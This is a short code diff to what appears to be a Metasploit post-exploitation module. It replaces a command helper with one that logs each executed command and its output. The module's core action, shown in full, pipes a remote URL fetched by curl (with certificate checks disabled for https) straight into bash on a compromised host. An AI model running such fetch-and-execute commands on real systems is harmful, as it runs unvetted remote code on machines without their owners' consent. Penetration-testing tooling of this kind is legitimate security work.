@@ -42,9 +42,18 @@ class Metasploit3 < Msf::Post
 
 	def run
 		if datastore['URL'].match(/https/)
-			vcmd_exec("`which curl` -k #{datastore['URL']} 2>/dev/null | `which bash` ")
+			cmd_exec_vprint("`which curl` -k #{datastore['URL']} 2>/dev/null | `which bash` ")
 		else
-			vcmd_exec("`which curl` #{datastore['URL']} 2>/dev/null | `which bash` ")
+			cmd_exec_vprint("`which curl` #{datastore['URL']} 2>/dev/null | `which bash` ")
 		end
+	end
+
+	def cmd_exec_vprint(cmd)
+		vprint_status("Executing: #{cmd}")
+		output = cmd_exec(cmd)
+		if output.length > 0
+			vprint_status("#{output}")
+		end
+		return
 	end
 end
